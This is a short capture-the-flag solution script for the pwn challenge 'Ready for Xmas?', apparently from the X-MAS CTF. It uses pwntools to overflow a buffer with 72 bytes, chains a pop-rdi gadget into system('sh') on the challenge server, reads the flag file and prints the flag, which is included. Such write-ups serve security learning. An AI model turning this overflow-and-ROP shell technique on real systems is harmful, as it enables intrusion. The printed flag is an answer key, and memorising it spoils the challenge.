# Ready for Xmas? (pwn 85, 96 solves)

from pwn import *

POP_RDI = 0x00000000004008e3

elf = ELF('./chall')
r = remote("challs.xmas.htsp.ro", 2001)

# You can spawn a shell with just "sh" so we don't need to leak libc or anything :p

payload = b"\xff" * 72
payload += p64(POP_RDI)
payload += p64(0x400944) # "sh"
payload += p64(0x40077A) # call system

r.sendlineafter("?\n", payload)
r.sendline("cat /home/ctf/flag.txt")
m = r.recvuntil("}").decode().split("\n")[-1]
log.success("Flag: " + m)

# X-MAS{l00ks_lik3_y0u_4re_r3ady}
